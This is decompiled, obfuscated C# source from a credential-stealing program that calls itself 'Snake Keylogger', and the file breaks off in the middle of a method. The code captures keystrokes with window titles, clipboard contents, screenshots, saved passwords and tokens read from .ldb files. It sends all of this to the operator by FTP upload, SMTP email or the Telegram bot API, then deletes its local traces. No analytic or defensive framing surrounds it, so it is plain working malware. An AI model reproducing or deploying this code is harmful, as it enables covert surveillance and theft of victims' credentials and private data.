    public static void \uF0B9̲ݶӺӓ(object _param0, EventArgs _param1)
    {
      if (Operators.CompareString(\uFFFDٗ\u05C3\uFFFDc.嵱ã\uFFFDҟ\uFFFD, "%FTPDV$", false) == 0)
      {
        FtpWebRequest ftpWebRequest = (FtpWebRequest) NewLateBinding.LateGet((object) null, typeof (WebRequest), "Create", new object[1]
        {
          Operators.AddObject(Operators.AddObject((object) (\uFFFDٗ\u05C3\uFFFDc.\uFFFDΩҡҏé + ʓ\uD95F\uDC77Śޤ.\u060CҚ쐬\u0385ٷ.Name + " - Clipboard Logs ID - "), \uFFFDٗ\u05C3\uFFFDc.\uFFFDУŲ\u005E̱), (object) \uFFFDٗ\u05C3\uFFFDc.اЅ\u058Fʤ콪)
        }, (string[]) null, (System.Type[]) null, (bool[]) null);
        try
        {
          ftpWebRequest.Method = "STOR";
          ftpWebRequest.Credentials = (ICredentials) new NetworkCredential(\uFFFDٗ\u05C3\uFFFDc.թ\uFFFD\uFFFDŎ\uFFFD, \uFFFDٗ\u05C3\uFFFDc.εOչéΩ);
          byte[] bytes = Encoding.UTF8.GetBytes("Clipboard | " + Environment.UserName + " | Snake\r\n" + \uFFFDٗ\u05C3\uFFFDc.\uFFFDtݶױǎ + "\r\n\r\n\r\n" + \uFFFDٗ\u05C3\uFFFDc.ɩݝ盀şל + "\r\n\r\n--------------------------------------------------");
          ftpWebRequest.ContentLength = (long) bytes.Length;
          using (Stream requestStream = ftpWebRequest.GetRequestStream())
          {
            requestStream.Write(bytes, 0, bytes.Length);
            requestStream.Close();
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          return;
        }
      }
      if (Operators.CompareString(\uFFFDٗ\u05C3\uFFFDc.嵱ã\uFFFDҟ\uFFFD, "$%SMTPDV$", false) == 0)
      {
        try
        {
          MailMessage message = new MailMessage();
          message.From = new MailAddress(\uFFFDٗ\u05C3\uFFFDc.ܣƌŔ\uFFFDЮ);
          message.To.Add(\uFFFDٗ\u05C3\uFFFDc.盀ִ\uFFFD븤ҟ);
          message.Subject = " Pc Name: " + Environment.UserName + " | Snake Keylogger";
          message.Body = "Clipboard | " + Environment.UserName + " | Snake\r\n" + \uFFFDٗ\u05C3\uFFFDc.\uFFFDtݶױǎ + "\r\n\r\n";
          MemoryStream contentStream = new MemoryStream(\uFFFDٗ\u05C3\uFFFDc.ɇş\uFFFD恁Α());
          message.Attachments.Add(new Attachment((Stream) contentStream, "Clipboard" + \uFFFDٗ\u05C3\uFFFDc.اЅ\u058Fʤ콪, "text/plain"));
          new SmtpClient(\uFFFDٗ\u05C3\uFFFDc.\uFFFDɛۚεƟ)
          {
            EnableSsl = (Operators.CompareString(\uFFFDٗ\u05C3\uFFFDc.恁\uF0B9\uFFFDŁ\uFFFD, "True", false) == 0),
            Port = Conversions.ToInteger(\uFFFDٗ\u05C3\uFFFDc.鈟\u0026\uFFFDZ恁),
            Credentials = ((ICredentialsByHost) new NetworkCredential(\uFFFDٗ\u05C3\uFFFDc.ܣƌŔ\uFFFDЮ, \uFFFDٗ\u05C3\uFFFDc.\uFFFDɛ콪\uFFFDܣ))
          }.Send(message);
          message.Dispose();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(\uFFFDٗ\u05C3\uFFFDc.嵱ã\uFFFDҟ\uFFFD, "$%TelegramDv$", false) == 0)
      {
        try
        {
          string str1 = "Clipboard | " + Environment.UserName + " | Snake\r\n" + \uFFFDٗ\u05C3\uFFFDc.\uFFFDtݶױǎ + "\r\n\r\n\r\n" + \uFFFDٗ\u05C3\uFFFDc.ɩݝ盀şל + "\r\n\r\n--------------------------------------------------";
          ServicePointManager.Expect100Continue = false;
          ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
          string str2 = "https://api.telegram.org/bot" + \uFFFDٗ\u05C3\uFFFDc.\uFFFD\uFFFD\u0026ۚ\u26CA + "/sendDocument?chat_id=" + \uFFFDٗ\u05C3\uFFFDc.\uFFFDۨ\uFFFD\u05C9O + "&caption=" + (" Pc Name: " + Environment.UserName + " | Snake Keylogger\r\n\r\nClipboard | " + Environment.UserName + " | Snake\r\n\r\n\r\n");
          \uFFFDٗ\u05C3\uFFFDc.\u02E8t\uDAD9\uDDB5\uFFFD("Clipboard" + \uFFFDٗ\u05C3\uFFFDc.اЅ\u058Fʤ콪, "application/x-ms-dos-executable", str2, str1);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
    }

    public static void 蠺Ӻۚ\uFFFD쐬(object _param0, EventArgs _param1)
    {
      string str1 = "Screenshot";
      string str2 = ".png";
      string path = ʓ\uD95F\uDC77Śޤ.\u060CҚ쐬\u0385ٷ.FileSystem.SpecialDirectories.MyDocuments + "\\SnakeKeylogger";
      try
      {
        if (Directory.Exists(path))
        {
          \uFFFDٗ\u05C3\uFFFDc.ЅӚˤʭ\uFFFD = ʓ\uD95F\uDC77Śޤ.\u060CҚ쐬\u0385ٷ.FileSystem.SpecialDirectories.MyDocuments + "\\SnakeKeylogger\\" + str1 + str2;
          int width = ʓ\uD95F\uDC77Śޤ.\u060CҚ쐬\u0385ٷ.Screen.Bounds.Width;
          Rectangle bounds = ʓ\uD95F\uDC77Śޤ.\u060CҚ쐬\u0385ٷ.Screen.Bounds;
          int height = bounds.Height;
          Size blockRegionSize = new Size(width, height);
          bounds = ʓ\uD95F\uDC77Śޤ.\u060CҚ쐬\u0385ٷ.Screen.Bounds;
          Bitmap bitmap = new Bitmap(bounds.Width, ʓ\uD95F\uDC77Śޤ.\u060CҚ쐬\u0385ٷ.Screen.Bounds.Height);
          Graphics.FromImage((Image) bitmap).CopyFromScreen(new Point(0, 0), new Point(0, 0), blockRegionSize);
          bitmap.Save(\uFFFDٗ\u05C3\uFFFDc.ЅӚˤʭ\uFFFD);
          \uFFFDٗ\u05C3\uFFFDc.ߡ̧Ɵ\u05C3ۣ();
          \uFFFDٗ\u05C3\uFFFDc.tҢ\uFFFDϘٕ();
        }
        else
        {
          Directory.CreateDirectory(path);
          Size blockRegionSize = new Size(ʓ\uD95F\uDC77Śޤ.\u060CҚ쐬\u0385ٷ.Screen.Bounds.Width, ʓ\uD95F\uDC77Śޤ.\u060CҚ쐬\u0385ٷ.Screen.Bounds.Height);
          Bitmap bitmap = new Bitmap(ʓ\uD95F\uDC77Śޤ.\u060CҚ쐬\u0385ٷ.Screen.Bounds.Width, ʓ\uD95F\uDC77Śޤ.\u060CҚ쐬\u0385ٷ.Screen.Bounds.Height);
          Graphics.FromImage((Image) bitmap).CopyFromScreen(new Point(0, 0), new Point(0, 0), blockRegionSize);
          bitmap.Save(\uFFFDٗ\u05C3\uFFFDc.ЅӚˤʭ\uFFFD);
          \uFFFDٗ\u05C3\uFFFDc.ߡ̧Ɵ\u05C3ۣ();
          \uFFFDٗ\u05C3\uFFFDc.tҢ\uFFFDϘٕ();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void ߡ̧Ɵ\u05C3ۣ()
    {
      if (Operators.CompareString(\uFFFDٗ\u05C3\uFFFDc.嵱ã\uFFFDҟ\uFFFD, "%FTPDV$", false) == 0)
      {
        FtpWebRequest ftpWebRequest = (FtpWebRequest) NewLateBinding.LateGet((object) null, typeof (WebRequest), "Create", new object[1]
        {
          Operators.AddObject(Operators.AddObject((object) (\uFFFDٗ\u05C3\uFFFDc.\uFFFDΩҡҏé + ʓ\uD95F\uDC77Śޤ.\u060CҚ쐬\u0385ٷ.Name + " - Screenshot Logs ID - "), \uFFFDٗ\u05C3\uFFFDc.\uFFFDУŲ\u005E̱), (object) ".png")
        }, (string[]) null, (System.Type[]) null, (bool[]) null);
        try
        {
          ftpWebRequest.Method = "STOR";
          ftpWebRequest.Credentials = (ICredentials) new NetworkCredential(\uFFFDٗ\u05C3\uFFFDc.թ\uFFFD\uFFFDŎ\uFFFD, \uFFFDٗ\u05C3\uFFFDc.εOչéΩ);
          byte[] buffer = System.IO.File.ReadAllBytes(\uFFFDٗ\u05C3\uFFFDc.ЅӚˤʭ\uFFFD);
          ftpWebRequest.ContentLength = (long) buffer.Length;
          using (Stream requestStream = ftpWebRequest.GetRequestStream())
          {
            requestStream.Write(buffer, 0, buffer.Length);
            requestStream.Close();
            System.IO.File.Delete(\uFFFDٗ\u05C3\uFFFDc.ЅӚˤʭ\uFFFD);
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          return;
        }
      }
      if (Operators.CompareString(\uFFFDٗ\u05C3\uFFFDc.嵱ã\uFFFDҟ\uFFFD, "$%SMTPDV$", false) == 0)
      {
        try
        {
          MailMessage message = new MailMessage();
          message.From = new MailAddress(\uFFFDٗ\u05C3\uFFFDc.ܣƌŔ\uFFFDЮ);
          message.To.Add(\uFFFDٗ\u05C3\uFFFDc.盀ִ\uFFFD븤ҟ);
          message.Subject = " Pc Name: " + Environment.UserName + " | Snake Keylogger";
          message.Body = "Screenshot | " + Environment.UserName + " | Snake\r\n" + \uFFFDٗ\u05C3\uFFFDc.\uFFFDtݶױǎ + "\r\n\r\n";
          Attachment attachment = new Attachment(\uFFFDٗ\u05C3\uFFFDc.ЅӚˤʭ\uFFFD);
          message.Attachments.Add(attachment);
          new SmtpClient(\uFFFDٗ\u05C3\uFFFDc.\uFFFDɛۚεƟ)
          {
            EnableSsl = (Operators.CompareString(\uFFFDٗ\u05C3\uFFFDc.恁\uF0B9\uFFFDŁ\uFFFD, "True", false) == 0),
            Port = Conversions.ToInteger(\uFFFDٗ\u05C3\uFFFDc.鈟\u0026\uFFFDZ恁),
            Credentials = ((ICredentialsByHost) new NetworkCredential(\uFFFDٗ\u05C3\uFFFDc.ܣƌŔ\uFFFDЮ, \uFFFDٗ\u05C3\uFFFDc.\uFFFDɛ콪\uFFFDܣ))
          }.Send(message);
          message.Dispose();
          \uFFFDٗ\u05C3\uFFFDc.tҢ\uFFFDϘٕ();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(\uFFFDٗ\u05C3\uFFFDc.嵱ã\uFFFDҟ\uFFFD, "$%TelegramDv$", false) == 0)
      {
        try
        {
          byte[] numArray = System.IO.File.ReadAllBytes(\uFFFDٗ\u05C3\uFFFDc.ЅӚˤʭ\uFFFD);
          ServicePointManager.Expect100Continue = false;
          ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
          string WľʭãҚ = "https://api.telegram.org/bot" + \uFFFDٗ\u05C3\uFFFDc.\uFFFD\uFFFD\u0026ۚ\u26CA + "/sendDocument?chat_id=" + \uFFFDٗ\u05C3\uFFFDc.\uFFFDۨ\uFFFD\u05C9O + "&caption=" + (" Pc Name: " + Environment.UserName + " | Snake Keylogger\r\n\r\nScreenshot | " + Environment.UserName + " | Snake\r\n" + \uFFFDٗ\u05C3\uFFFDc.\uFFFDtݶױǎ + "\r\n\r\n");
          \uFFFDٗ\u05C3\uFFFDc.z\uFFFDK\uFFFD\uFFFD(numArray, \uFFFDٗ\u05C3\uFFFDc.ЅӚˤʭ\uFFFD, "application/x-ms-dos-executable", WľʭãҚ);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
    }

    public static void tҢ\uFFFDϘٕ()
    {
      int num1;
      int num2;
      try
      {
label_2:
        int num3 = 1;
        string path = ʓ\uD95F\uDC77Śޤ.\u060CҚ쐬\u0385ٷ.FileSystem.SpecialDirectories.MyDocuments + "\\SnakeKeylogger";
label_3:
        ProjectData.ClearProjectError();
        num1 = -2;
label_4:
        num3 = 3;
        if (!Directory.Exists(path))
          goto label_7;
label_5:
        num3 = 4;
        Directory.Delete(path, true);
label_6:
label_7:
        goto label_14;
label_9:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_2;
              case 2:
                goto label_3;
              case 3:
                goto label_4;
              case 4:
                goto label_5;
              case 5:
                goto label_6;
              case 6:
                goto label_14;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_9;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_14:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    public static byte[] 퓜\uFFFDޗ\u26CA\uFFFD() => Encoding.Unicode.GetBytes("KP | " + Environment.UserName + " | Snake\r\n" + \uFFFDٗ\u05C3\uFFFDc.\uFFFDtݶױǎ + "\r\n\r\n\r\n" + \uFFFDٗ\u05C3\uFFFDc.ӤԜ\uFFFD\uFFFD\u0385.ToString() + "\r\n\r\n\r\n--------------------------------------------------");

    private static void C\uFFFD\uFFFDCϒ(object _param0, EventArgs _param1)
    {
      if (Operators.CompareString(\uFFFDٗ\u05C3\uFFFDc.嵱ã\uFFFDҟ\uFFFD, "%FTPDV$", false) == 0)
      {
        FtpWebRequest ftpWebRequest = (FtpWebRequest) NewLateBinding.LateGet((object) null, typeof (WebRequest), "Create", new object[1]
        {
          Operators.AddObject(Operators.AddObject((object) (\uFFFDٗ\u05C3\uFFFDc.\uFFFDΩҡҏé + ʓ\uD95F\uDC77Śޤ.\u060CҚ쐬\u0385ٷ.Name + " - keystroke Logs ID - "), \uFFFDٗ\u05C3\uFFFDc.\uFFFDУŲ\u005E̱), (object) \uFFFDٗ\u05C3\uFFFDc.اЅ\u058Fʤ콪)
        }, (string[]) null, (System.Type[]) null, (bool[]) null);
        try
        {
          ftpWebRequest.Method = "STOR";
          ftpWebRequest.Credentials = (ICredentials) new NetworkCredential(\uFFFDٗ\u05C3\uFFFDc.թ\uFFFD\uFFFDŎ\uFFFD, \uFFFDٗ\u05C3\uFFFDc.εOչéΩ);
          byte[] bytes = Encoding.UTF8.GetBytes("KP | " + Environment.UserName + " | Snake\r\n" + \uFFFDٗ\u05C3\uFFFDc.\uFFFDtݶױǎ + "\r\n\r\n\r\n" + \uFFFDٗ\u05C3\uFFFDc.ӤԜ\uFFFD\uFFFD\u0385.ToString() + "\r\n\r\n\r\n--------------------------------------------------");
          ftpWebRequest.ContentLength = (long) bytes.Length;
          using (Stream requestStream = ftpWebRequest.GetRequestStream())
          {
            requestStream.Write(bytes, 0, bytes.Length);
            requestStream.Close();
            \uFFFDٗ\u05C3\uFFFDc.ǎW̮Òå = "";
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          return;
        }
      }
      if (Operators.CompareString(\uFFFDٗ\u05C3\uFFFDc.嵱ã\uFFFDҟ\uFFFD, "$%SMTPDV$", false) == 0)
      {
        try
        {
          MailMessage message = new MailMessage();
          message.From = new MailAddress(\uFFFDٗ\u05C3\uFFFDc.ܣƌŔ\uFFFDЮ);
          message.To.Add(\uFFFDٗ\u05C3\uFFFDc.盀ִ\uFFFD븤ҟ);
          message.Subject = " Pc Name: " + Environment.UserName + " | Snake Keylogger";
          MemoryStream contentStream = new MemoryStream(\uFFFDٗ\u05C3\uFFFDc.퓜\uFFFDޗ\u26CA\uFFFD());
          message.Attachments.Add(new Attachment((Stream) contentStream, "Keystrokes" + \uFFFDٗ\u05C3\uFFFDc.اЅ\u058Fʤ콪, "text/plain"));
          message.Body = "KP | " + Environment.UserName + " | Snake\r\n\r\n\r\n";
          new SmtpClient(\uFFFDٗ\u05C3\uFFFDc.\uFFFDɛۚεƟ)
          {
            EnableSsl = (Operators.CompareString(\uFFFDٗ\u05C3\uFFFDc.恁\uF0B9\uFFFDŁ\uFFFD, "True", false) == 0),
            Port = Conversions.ToInteger(\uFFFDٗ\u05C3\uFFFDc.鈟\u0026\uFFFDZ恁),
            Credentials = ((ICredentialsByHost) new NetworkCredential(\uFFFDٗ\u05C3\uFFFDc.ܣƌŔ\uFFFDЮ, \uFFFDٗ\u05C3\uFFFDc.\uFFFDɛ콪\uFFFDܣ))
          }.Send(message);
          message.Dispose();
          \uFFFDٗ\u05C3\uFFFDc.ǎW̮Òå = "";
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(\uFFFDٗ\u05C3\uFFFDc.嵱ã\uFFFDҟ\uFFFD, "$%TelegramDv$", false) == 0)
      {
        try
        {
          string str1 = "Keylogger | " + Environment.UserName + " | Snake\r\n" + \uFFFDٗ\u05C3\uFFFDc.\uFFFDtݶױǎ + "\r\n\r\n\r\n" + \uFFFDٗ\u05C3\uFFFDc.ӤԜ\uFFFD\uFFFD\u0385.ToString() + "\r\n\r\n\r\n--------------------------------------------------";
          ServicePointManager.Expect100Continue = false;
          ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
          string str2 = "https://api.telegram.org/bot" + \uFFFDٗ\u05C3\uFFFDc.\uFFFD\uFFFD\u0026ۚ\u26CA + "/sendDocument?chat_id=" + \uFFFDٗ\u05C3\uFFFDc.\uFFFDۨ\uFFFD\u05C9O + "&caption=" + (" Pc Name: " + Environment.UserName + " | Snake Keylogger\r\n\r\nKeylogger | " + Environment.UserName + " | Snake\r\n\r\n\r\n");
          \uFFFDٗ\u05C3\uFFFDc.\u02E8t\uDAD9\uDDB5\uFFFD("SnakeKeylogger" + \uFFFDٗ\u05C3\uFFFDc.اЅ\u058Fʤ콪, "application/x-ms-dos-executable", str2, str1);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
    }

    private static void ꓞ\uFFFDƜ\uFFFD\uFFFD(
      object _param0,
      \uFFFDٗ\u05C3\uFFFDc.KeyLoggerEventArgs _param1)
    {
      if (Operators.CompareString(\uFFFDٗ\u05C3\uFFFDc.\u00AB\uFFFDݶ\uD9A6\uDF1A, \uFFFDٗ\u05C3\uFFFDc.\uFFFDϒ\uFFFD\uFFFDŧ.CurrentWindow, false) != 0)
      {
        \uFFFDٗ\u05C3\uFFFDc.\u00AB\uFFFDݶ\uD9A6\uDF1A = \uFFFDٗ\u05C3\uFFFDc.\uFFFDϒ\uFFFD\uFFFDŧ.CurrentWindow;
        \uFFFDٗ\u05C3\uFFFDc.W뜸\uFFFDΠŴ(string.Format("\r\n[ -- {0} -- ]\r\n", (object) \uFFFDٗ\u05C3\uFFFDc.\uFFFDϒ\uFFFD\uFFFDŧ.CurrentWindow));
      }
      \uFFFDٗ\u05C3\uFFFDc.W뜸\uFFFDΠŴ(string.Format("{0}", (object) _param1.StringValue));
    }

    private static void \uFFFDή丐\u058FҢ(
      object _param0,
      \uFFFDٗ\u05C3\uFFFDc.KeyLoggerEventArgs _param1)
    {
      \uFFFDٗ\u05C3\uFFFDc.W뜸\uFFFDΠŴ(string.Format("{0}", (object) _param1.StringValue));
    }

    private static void W뜸\uFFFDΠŴ(string _param0) => \uFFFDٗ\u05C3\uFFFDc.ӤԜ\uFFFD\uFFFD\u0385.Append(_param0);

    [DllImport("user32.dll", EntryPoint = "GetForegroundWindow")]
    public static extern IntPtr ҟOεή츠();

    [DllImport("user32.dll", EntryPoint = "GetWindowText")]
    public static extern int \u0306ۣٚ泮Ң(IntPtr _param0, StringBuilder _param1, int _param2);

    [DllImport("ntdll.dll", EntryPoint = "Wekakekakd", SetLastError = true)]
    public static extern int \u0032똛\uFFFDֵ\u26CA(
      IntPtr _param0,
      int _param1,
      ref int _param2,
      int _param3);

    [DllImport("user32.dll", EntryPoint = "GetWindowThreadProcessId", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int \uFFFD\uFFFDΑm똛(IntPtr _param0, ref int _param1);

    [DllImport("user32", EntryPoint = "GetKeyboardLayout", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int \uFFFDʓ\uFFFD嵱ë(int _param0);

    [DllImport("user32.dll", EntryPoint = "ToUnicodeEx")]
    public static extern int Օ\u002D\uD81D\uDDCFɮ(
      uint ڿεֵ̱z,
      uint _param1,
      byte[] _param2,
      [MarshalAs(UnmanagedType.LPWStr), Out] StringBuilder 똛ۚ蠺Ɯٚ,
      int _param4,
      uint _param5,
      IntPtr _param6);

    [DllImport("user32.dll", EntryPoint = "GetKeyboardState")]
    public static extern bool \uFFFDߡŔԌ\u0609(byte[] _param0);

    [DllImport("user32.dll", EntryPoint = "MapVirtualKey")]
    public static extern uint Ԍ\uFFFD\uFFFDУ\uFFFD(uint _param0, uint _param1);

    private static void \u07B4Ł\uFFFD㹃㠰()
    {
      ThreadStart start;
      // ISSUE: reference to a compiler-generated field
      if (\uFFFDٗ\u05C3\uFFFDc._Closure\u0024__.\u0024I106\u002D0 != null)
      {
        // ISSUE: reference to a compiler-generated field
        start = \uFFFDٗ\u05C3\uFFFDc._Closure\u0024__.\u0024I106\u002D0;
      }
      else
      {
        // ISSUE: reference to a compiler-generated field
        \uFFFDٗ\u05C3\uFFFDc._Closure\u0024__.\u0024I106\u002D0 = start = (ThreadStart) (() =>
        {
          \uFFFDٗ\u05C3\uFFFDc.\uFFFDϒ\uFFFD\uFFFDŧ = new \uFFFDٗ\u05C3\uFFFDc.KeyLogger();
          \uFFFDٗ\u05C3\uFFFDc.\uFFFDϒ\uFFFD\uFFFDŧ.KeyDown += new \uFFFDٗ\u05C3\uFFFDc.KeyLoggerEventArgsEventHandler(\uFFFDٗ\u05C3\uFFFDc.ꓞ\uFFFDƜ\uFFFD\uFFFD);
          \uFFFDٗ\u05C3\uFFFDc.\uFFFDϒ\uFFFD\uFFFDŧ.KeyUp += new \uFFFDٗ\u05C3\uFFFDc.KeyLoggerEventArgsEventHandler(\uFFFDٗ\u05C3\uFFFDc.\uFFFDή丐\u058FҢ);
          Application.Run();
        });
      }
      new Thread(start).Start();
    }

    public static byte[] ܣ\u02E8㠰\u0089ʭ() => Encoding.Unicode.GetBytes(\uFFFDٗ\u05C3\uFFFDc.\uFFFD̔ٷі쐬("PW | " + Environment.UserName + " | Snake\r\n" + \uFFFDٗ\u05C3\uFFFDc.\uFFFDtݶױǎ + "\r\n" + \uFFFDٗ\u05C3\uFFFDc.\u0089\uFFFD\uFFFD\u0040\u07B4 + "\r\n\r\n\r\n\r\n\r\n--------------------------------------------------", \uFFFDٗ\u05C3\uFFFDc.ΑW\uF0B9퓜R));

    public static byte[] \uFFFD븤Ԝcƚ() => Encoding.Default.GetBytes(\uFFFDٗ\u05C3\uFFFDc.\uFFFD̔ٷі쐬("PW | " + Environment.UserName + " | Snake\r\n" + \uFFFDٗ\u05C3\uFFFDc.\uFFFDtݶױǎ + "\r\n" + \uFFFDٗ\u05C3\uFFFDc.\u0089\uFFFD\uFFFD\u0040\u07B4 + "\r\n\r\n\r\n\r\n\r\n--------------------------------------------------", \uFFFDٗ\u05C3\uFFFDc.ΑW\uF0B9퓜R));

    private static void \u0655\uFFFD\u0385\uDBB0\uDED3(object _param0, EventArgs کƚ콪Юс)
    {
      if (Operators.CompareString(\uFFFDٗ\u05C3\uFFFDc.嵱ã\uFFFDҟ\uFFFD, "%FTPDV$", false) == 0)
      {
        FtpWebRequest ftpWebRequest = (FtpWebRequest) NewLateBinding.LateGet((object) null, typeof (WebRequest), "Create", new object[1]
        {
          Operators.AddObject(Operators.AddObject((object) (\uFFFDٗ\u05C3\uFFFDc.\uFFFDΩҡҏé + ʓ\uD95F\uDC77Śޤ.\u060CҚ쐬\u0385ٷ.Name + " - Passwords ID - "), \uFFFDٗ\u05C3\uFFFDc.\uFFFDУŲ\u005E̱), (object) \uFFFDٗ\u05C3\uFFFDc.اЅ\u058Fʤ콪)
        }, (string[]) null, (System.Type[]) null, (bool[]) null);
        try
        {
          ftpWebRequest.Method = "STOR";
          ftpWebRequest.Credentials = (ICredentials) new NetworkCredential(\uFFFDٗ\u05C3\uFFFDc.թ\uFFFD\uFFFDŎ\uFFFD, \uFFFDٗ\u05C3\uFFFDc.εOչéΩ);
          byte[] bytes = Encoding.UTF8.GetBytes(\uFFFDٗ\u05C3\uFFFDc.\uFFFD̔ٷі쐬("PW | " + Environment.UserName + " | Snake\r\n" + \uFFFDٗ\u05C3\uFFFDc.\uFFFDtݶױǎ + "\r\n" + \uFFFDٗ\u05C3\uFFFDc.\u0089\uFFFD\uFFFD\u0040\u07B4 + "\r\n\r\n\r\n\r\n\r\n--------------------------------------------------", \uFFFDٗ\u05C3\uFFFDc.ΑW\uF0B9퓜R));
          ftpWebRequest.ContentLength = (long) bytes.Length;
          using (Stream requestStream = ftpWebRequest.GetRequestStream())
          {
            requestStream.Write(bytes, 0, bytes.Length);
            requestStream.Close();
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          return;
        }
      }
      if (Operators.CompareString(\uFFFDٗ\u05C3\uFFFDc.嵱ã\uFFFDҟ\uFFFD, "$%SMTPDV$", false) == 0)
      {
        try
        {
          MailMessage message = new MailMessage();
          message.From = new MailAddress(\uFFFDٗ\u05C3\uFFFDc.ܣƌŔ\uFFFDЮ);
          message.To.Add(\uFFFDٗ\u05C3\uFFFDc.盀ִ\uFFFD븤ҟ);
          message.Subject = " Pc Name: " + Environment.UserName + " | Snake Keylogger";
          message.Body = "PW | " + Environment.UserName + " | Snake\r\n\r\n\r\n";
          byte[] buffer1 = \uFFFDٗ\u05C3\uFFFDc.ܣ\u02E8㠰\u0089ʭ();
          byte[] buffer2 = \uFFFDٗ\u05C3\uFFFDc.\uFFFD븤Ԝcƚ();
          MemoryStream contentStream1 = new MemoryStream(buffer1);
          MemoryStream contentStream2 = new MemoryStream(buffer2);
          message.Attachments.Add(new Attachment((Stream) contentStream1, "Passwords" + \uFFFDٗ\u05C3\uFFFDc.اЅ\u058Fʤ콪, "text/plain"));
          message.Attachments.Add(new Attachment((Stream) contentStream2, "User" + \uFFFDٗ\u05C3\uFFFDc.اЅ\u058Fʤ콪, "text/plain"));
          new SmtpClient(\uFFFDٗ\u05C3\uFFFDc.\uFFFDɛۚεƟ)
          {
            EnableSsl = (Operators.CompareString(\uFFFDٗ\u05C3\uFFFDc.恁\uF0B9\uFFFDŁ\uFFFD, "True", false) == 0),
            Port = Conversions.ToInteger(\uFFFDٗ\u05C3\uFFFDc.鈟\u0026\uFFFDZ恁),
            Credentials = ((ICredentialsByHost) new NetworkCredential(\uFFFDٗ\u05C3\uFFFDc.ܣƌŔ\uFFFDЮ, \uFFFDٗ\u05C3\uFFFDc.\uFFFDɛ콪\uFFFDܣ))
          }.Send(message);
          message.Dispose();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(\uFFFDٗ\u05C3\uFFFDc.嵱ã\uFFFDҟ\uFFFD, "$%TelegramDv$", false) == 0)
      {
        try
        {
          string str1 = \uFFFDٗ\u05C3\uFFFDc.\uFFFD̔ٷі쐬("PW | " + Environment.UserName + " | Snake\r\n" + \uFFFDٗ\u05C3\uFFFDc.\uFFFDtݶױǎ + "\r\n" + \uFFFDٗ\u05C3\uFFFDc.\u0089\uFFFD\uFFFD\u0040\u07B4 + "\r\n\r\n\r\n\r\n\r\n--------------------------------------------------", \uFFFDٗ\u05C3\uFFFDc.ΑW\uF0B9퓜R);
          ServicePointManager.Expect100Continue = false;
          ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
          string str2 = "https://api.telegram.org/bot" + \uFFFDٗ\u05C3\uFFFDc.\uFFFD\uFFFD\u0026ۚ\u26CA + "/sendDocument?chat_id=" + \uFFFDٗ\u05C3\uFFFDc.\uFFFDۨ\uFFFD\u05C9O + "&caption=" + (" Pc Name: " + Environment.UserName + " | Snake Keylogger\r\n\r\nPW | " + Environment.UserName + " | Snake\r\n\r\n\r\n");
          \uFFFDٗ\u05C3\uFFFDc.\u0089ʭ̮\uFFFDЦ("SnakePW" + \uFFFDٗ\u05C3\uFFFDc.اЅ\u058Fʤ콪, "application/x-ms-dos-executable", str2, str1);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
    }

    private static bool \uFFFDЅמR쐬(ref string _param0)
    {
      bool flag;
      if (Directory.Exists(_param0))
      {
        FileInfo[] files = new DirectoryInfo(_param0).GetFiles();
        int index = 0;
        while (index < files.Length)
        {
          FileInfo fileInfo = files[index];
          if (fileInfo.Name.EndsWith(".ldb") && System.IO.File.ReadAllText(fileInfo.FullName).Contains("oken"))
          {
            _param0 += fileInfo.Name;
            return _param0.EndsWith(".ldb");
          }
          checked { ++index; }
        }
        flag = _param0.EndsWith(".ldb");
      }
      else
        flag = false;
      return flag;
    }

    private static string \u061Dåɛבƚ(string ϫҡ늻اϱ)
    {
      string[] collection = ϫҡ늻اϱ.Substring(checked (ϫҡ늻اϱ.IndexOf("oken") + 4)).Split('"');
      List<string> stringList = new List<string>();
      stringList.AddRange((IEnumerable<string>) collection);
      stringList.RemoveAt(0);
      return string.Join("\"", stringList.ToArray());
    }

    private static string \uFFFDﾭٷ뜸\uFFFD(string _param0, bool _param1 = false)
    {
      string str1 = Encoding.UTF8.GetString(System.IO.File.ReadAllBytes(_param0));
      string str2 = "";
      string ϫҡ늻اϱ = str1;
      while (ϫҡ늻اϱ.Contains("oken"))
      {
        string[] strArray = \uFFFDٗ\u05C3\uFFFDc.\u061Dåɛבƚ(ϫҡ늻اϱ).Split('"');
        str2 = strArray[0];
        ϫҡ늻اϱ = string.Join("\"", strArray);
        if (_param1 && str2.Length == 59)
          break;
      }
      return str2;
    }

    public static void ǎ\uFFFD꾯Ɯꓞ()
    {
